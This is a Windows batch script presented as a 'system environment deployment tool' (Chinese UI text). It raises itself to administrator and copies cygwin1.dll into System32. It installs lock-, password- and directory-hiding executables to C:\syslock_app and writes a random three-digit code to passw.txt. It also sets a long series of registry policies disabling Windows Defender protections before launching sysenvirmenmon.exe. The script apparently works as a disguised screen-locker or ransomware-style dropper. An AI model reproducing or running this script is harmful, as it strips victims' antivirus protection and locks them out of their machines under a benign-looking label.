@echo off
setlocal enabledelayedexpansion
title 系统环境部署工具

:: ========== 自动提权 ==========
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo 请求管理员权限...
    powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0' -ArgumentList '%*'"
    exit /b
)

:: ========== 变量定义 ==========
set "SCRIPT_DIR=%~dp0"
set "SYS_DIR=C:\syslock_app"
set "SYSTEM32=%windir%\System32"

:: ========== 1. 复制 cygwin1.dll ==========
if exist "%SCRIPT_DIR%cygwin1.dll" (
    echo 正在复制 cygwin1.dll 到 %SYSTEM32% ...
    copy /Y "%SCRIPT_DIR%cygwin1.dll" "%SYSTEM32%\" >nul
) else (
    echo 警告：当前目录下未找到 cygwin1.dll，跳过复制。
)

:: ========== 2. 判断是否需要首次部署 ==========
if not exist "%SYS_DIR%\coun.txt" (
    echo coun.txt 不存在，执行首次部署...

    :: 创建目标目录
    if not exist "%SYS_DIR%" mkdir "%SYS_DIR%"

    :: 要复制的文件列表（注意不包含本 bat 自身）
    set "FILE_LIST=unlockrun.ps1 unlockrun.exe syspop_up.exe syspass.exe syslockcoun.exe sysenvirmenmon.exe passw.txt lockrun_m.exe lock_bg.jpg HideDirectory.exe cygwin1.dll coun.txt"

    for %%f in (%FILE_LIST%) do (
        if exist "%SCRIPT_DIR%%%f" (
            echo 复制 %%f
            copy /Y "%SCRIPT_DIR%%%f" "%SYS_DIR%\" >nul
        ) else (
            echo 警告：%%f 不存在，跳过
        )
    )

    :: 生成三位随机数写入 passw.txt
    set /a rand=%random% %% 1000
    set "randstr=000!rand!"
    set "randstr=!randstr:~-3!"
    echo !randstr! > "%SYS_DIR%\passw.txt"
    echo 已生成随机码 !randstr! 并写入 passw.txt

) else (
    echo coun.txt 已存在，跳过文件部署。
)

:: ========== 3. 修改注册表（禁用 Windows Defender） ==========
echo 正在修改 Windows Defender 注册表项...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableSpecialRunningModes" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 1 /f >nul

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f >nul

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f >nul

echo 注册表修改完成。

:: ========== 4. 运行 sysenvirmenmon.exe ==========
if exist "%SYS_DIR%\sysenvirmenmon.exe" (
    echo 正在启动 sysenvirmenmon.exe ...
    start "" "%SYS_DIR%\sysenvirmenmon.exe"
) else (
    echo 错误：%SYS_DIR%\sysenvirmenmon.exe 不存在，无法启动。
)

pause
exit /b